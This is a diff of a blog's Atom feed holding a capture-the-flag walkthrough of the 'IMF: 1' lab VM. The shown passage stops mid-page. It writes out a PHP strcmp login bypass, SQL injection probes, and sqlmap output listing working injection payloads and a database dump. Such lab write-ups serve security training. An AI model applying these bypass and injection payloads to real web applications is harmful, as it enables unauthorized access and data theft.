@@ -1,4 +1,1987 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.2">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2018-02-24T18:36:47-06:00</updated><id>/</id><title type="html">T0w3ntum</title><subtitle>Comming soon</subtitle><entry><title type="html">Buffer Overflows and You</title><link href="/2016-08-05/Buffer-overflows-and-you" rel="alternate" type="text/html" title="Buffer Overflows and You" /><published>2016-08-05T00:00:00-05:00</published><updated>2016-08-05T00:00:00-05:00</updated><id>/2016-08-05/Buffer-overflows-and-you</id><content type="html" xml:base="/2016-08-05/Buffer-overflows-and-you">&lt;p&gt;I wanted to do an article on Buffer Overflows, there are many articles on Buffer Overflows but this one is mine! I’m going to take it
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-02-24T19:06:05-06:00</updated><id>http://localhost:4000/</id><title type="html">T0w3ntum</title><subtitle>Comming soon</subtitle><entry><title type="html">IMF: 1</title><link href="http://localhost:4000/2016-11-06/IMF" rel="alternate" type="text/html" title="IMF: 1" /><published>2016-11-06T00:00:00-05:00</published><updated>2016-11-06T00:00:00-05:00</updated><id>http://localhost:4000/2016-11-06/IMF</id><content type="html" xml:base="http://localhost:4000/2016-11-06/IMF">&lt;h2 id=&quot;imf-1-walkthrough&quot;&gt;IMF: 1 Walkthrough&lt;/h2&gt;
+
+&lt;p&gt;As always, let’s start off with some enumeration to see what we are dealing with here.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap --min-rate=400 -T4 -p- 192.168.1.62
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-11-04 18:51 EDT
+Nmap scan report for imf (192.168.1.62)
+Host is up (0.00068s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 00:0C:29:5F:9F:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 86.89 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Not much, port 8o only. Let’s see what’s going on with it.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# curl -s http://192.168.1.62 | html2text
+
+ Toggle navigation
+    * Home
+    * Projects
+    * Contact_Us
+
+****** Impossible Mission Force ******
+An independent intelligence agency for the United States government
+specialising in espionage.
+
+Copyright Â© 2016 Impossible Mission Force. All rights reserved.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I checked all the other pages, looks like we have our first flag on contact.php&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;flag1{YWxsdGhlZmlsZXM=}&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# curl -s http://192.168.1.62/contact.php
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no-js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+...SNIP...
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;section&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;service&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- flag1{YWxsdGhlZmlsZXM=} --&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;service-wrapper&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+...SNIP...
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+
+
+root@kali:~# echo YWxsdGhlZmlsZXM= | base64 -d
+allthefiles
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Also interesting was the name of the JavaScript files. Appeared to be base64. Judging by the hint from Flag1, I combined them into one string and decoded it.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!-- Js --&amp;gt;
+        &amp;lt;script src=&quot;js/vendor/modernizr-2.6.2.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+        &amp;lt;script src=&quot;js/vendor/jquery-1.10.2.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+        &amp;lt;script src=&quot;js/bootstrap.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+        &amp;lt;script src=&quot;js/ZmxhZzJ7YVcxbVl.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+        &amp;lt;script src=&quot;js/XUnRhVzVwYzNS.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+        &amp;lt;script src=&quot;js/eVlYUnZjZz09fQ==.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+        &amp;lt;script&amp;gt;
+
+root@kali:~# echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 -d
+flag2{aW1mYWRtaW5pc3RyYXRvcg==}
+
+root@kali:~# echo aW1mYWRtaW5pc3RyYXRvcg== | base64 -d
+imfadministratorr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;flag2{aW1mYWRtaW5pc3RyYXRvcg==}&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Decoding flag2, we get imfadministrator. As I wasn’t seeing much else, I figured it might be a directory. I was right.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# curl -s http://192.168.1.62/imfadministrator/ | html2text
+Username:[user                ]
+Password:[********************]
+[Login]
+root@kali:~#
+root@kali:~# curl -s http://192.168.1.62/imfadministrator/
+&amp;lt;form method=&quot;POST&quot; action=&quot;&quot;&amp;gt;
+&amp;lt;label&amp;gt;Username:&amp;lt;/label&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;&quot;&amp;gt;&amp;lt;br /&amp;gt;
+&amp;lt;label&amp;gt;Password:&amp;lt;/label&amp;gt;&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot; value=&quot;&quot;&amp;gt;&amp;lt;br /&amp;gt;
+&amp;lt;input type=&quot;submit&quot; value=&quot;Login&quot;&amp;gt;
+&amp;lt;!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger --&amp;gt;
+&amp;lt;/form&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I was presented with a login form, judging by the HTML comment, looks like SQL isn’t working…&lt;/p&gt;
+
+&lt;p&gt;I enumerated the usernames a bit and found that the only active user was &lt;strong&gt;rmichaels&lt;/strong&gt;. I gathered the usernames from the contact page.&lt;/p&gt;
+
+&lt;p&gt;I spent a good amount of time on this, including SQL authentication bypass just in case. Waldo over at IRC gave me his idea and a &lt;a href=&quot;http://danuxx.blogspot.ca/2013/03/unauthorized-access-bypassing-php-strcmp.html&quot;&gt;link&lt;/a&gt; he was looking at. Turns out it contained the answer.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;flag3{Y29udGludWVUT2Ntcw==}&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# curl -X POST -F &quot;pass=password&quot; -F &quot;user=rmichaels&quot; http://192.168.1.62/imfadministrator/
+Invalid password&amp;lt;form method=&quot;POST&quot; action=&quot;&quot;&amp;gt;
+&amp;lt;label&amp;gt;Username:&amp;lt;/label&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;&quot;&amp;gt;&amp;lt;br /&amp;gt;
+&amp;lt;label&amp;gt;Password:&amp;lt;/label&amp;gt;&amp;lt;input type=&quot;password&quot; name=&quot;pass&quot; value=&quot;&quot;&amp;gt;&amp;lt;br /&amp;gt;
+&amp;lt;input type=&quot;submit&quot; value=&quot;Login&quot;&amp;gt;
+&amp;lt;!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger --&amp;gt;
+&amp;lt;/form&amp;gt;
+root@kali:~#
+root@kali:~# curl -c /tmp/imf.cookie -X POST -F &quot;pass[]=password&quot; -F &quot;user=rmichaels&quot; http://192.168.1.62/imfadministrator/
+flag3{Y29udGludWVUT2Ntcw==}&amp;lt;br /&amp;gt;Welcome, rmichaels&amp;lt;br /&amp;gt;&amp;lt;a href='cms.php?pagename=home'&amp;gt;IMF CMS&amp;lt;/a&amp;gt;r
+
+
+root@kali:~# echo Y29udGludWVUT2Ntcw== | base64 -d
+continueTOcms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Following the clues, I continued to the CMS and enumerated the pages a bit.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# curl -b /tmp/imf.cookie http://192.168.1.62/imfadministrator/cms.php --data &quot;pagename=home&quot;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;IMF CMS&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;IMF CMS&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+Menu:
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=home'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=upload'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Upload Report&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=disavowlist'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Disavowed list&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+Logout
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
+Welcome to the IMF Administration.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+
+root@kali:~# curl -b /tmp/imf.cookie http://192.168.1.62/imfadministrator/cms.php?pagename=upload
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;IMF CMS&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;IMF CMS&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+Menu:
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=home'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=upload'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Upload Report&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=disavowlist'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Disavowed list&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+Logout
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
+Under Construction.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+
+root@kali:~# curl -b /tmp/imf.cookie http://192.168.1.62/imfadministrator/cms.php?pagename=disavowlist
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;IMF CMS&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;IMF CMS&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+Menu:
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=home'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=upload'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Upload Report&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=disavowlist'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Disavowed list&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+Logout
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Disavowed List&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./images/redacted.jpg&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;&lt;/span&gt;*********&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&lt;/span&gt;****** ******&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&lt;/span&gt;*******&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&lt;/span&gt;**** ********&lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&amp;lt;/ul&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;-Secretary&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I tried LFI/RFI on the pagename= parameter with no success. Thinking it might be SQL injection, I tried ‘1’ OR ‘1 and got an error message.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# curl -b /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/cms.php?pagename=%271%27%20OR%20%271'
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;IMF CMS&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;IMF CMS&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+Menu:
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=home'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=upload'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Upload Report&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=disavowlist'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Disavowed list&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+Logout
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;Warning&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt;:  mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in &lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;/var/www/html/imfadministrator/cms.php&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; on line &lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;29&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Time to fire up SQLMap.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# sqlmap --cookie=&quot;PHPSESSID=b1qs1kve0kevsanmk870586g31&quot; --url &quot;http://192.168.1.62/imfadministrator/cms.php?pagename=home&quot; --dump --dbms=MySQL --threads 5
+         _
+ ___ ___| |_____ ___ ___  {1.0.9.1#dev}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 19:58:06
+
+[19:58:06] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pagename (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pagename=home' AND 5180=5180 AND 'qpzo'='qpzo
+
+    Type: error-based
+    Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagename=home' AND (SELECT 8478 FROM(SELECT COUNT(*),CONCAT(0x7178627871,(SELECT (ELT(8478=8478,1))),0x71787a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'KnKx'='KnKx
+
+    Type: AND/OR time-based blind
+    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind
+    Payload: pagename=home' AND SLEEP(5) AND 'CkoX'='CkoX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 1 column
+    Payload: pagename=-7536' UNION ALL SELECT CONCAT(0x7178627871,0x43424d43504d6a4d6b466e525a71467443576a6149516a45434d624d68484e56655647446d766b64,0x71787a6271)#
+---
+...SNIP...
+Database: admin
+Table: pages
+[4 entries]
++----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | pagename             | pagedata                                                                                                                                                              |
++----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | upload               | Under Construction.                                                                                                                                                   |
+| 2  | home                 | Welcome to the IMF Administration.                                                                                                                                    |
+| 3  | tutorials-incomplete | Training classrooms available. &amp;lt;br /&amp;gt;&amp;lt;img src=&quot;./images/whiteboard.jpg&quot;&amp;gt;&amp;lt;br /&amp;gt; Contact us for training.                                                               |
+| 4  | disavowlist          | &amp;lt;h1&amp;gt;Disavowed List&amp;lt;/h1&amp;gt;&amp;lt;img src=&quot;./images/redacted.jpg&quot;&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;*********&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;****** ******&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;*******&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;**** ********&amp;lt;/li&amp;gt;&amp;lt;/ul&amp;gt;&amp;lt;br /&amp;gt;-Secretary |
++----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+[19:58:08] [INFO] table 'admin.pages' dumped to CSV file '/root/.sqlmap/output/192.168.1.62/dump/admin/pages.csv'
+[19:58:08] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.62'
+
+[*] shutting down at 19:58:08
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looks like we have another page, tutorials-incomplete.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# curl -s -b /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/cms.php?pagename=tutorials-incomplete'
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;IMF CMS&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;IMF CMS&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+Menu:
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=home'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=upload'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Upload Report&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cms.php?pagename=disavowlist'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Disavowed list&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; |
+Logout
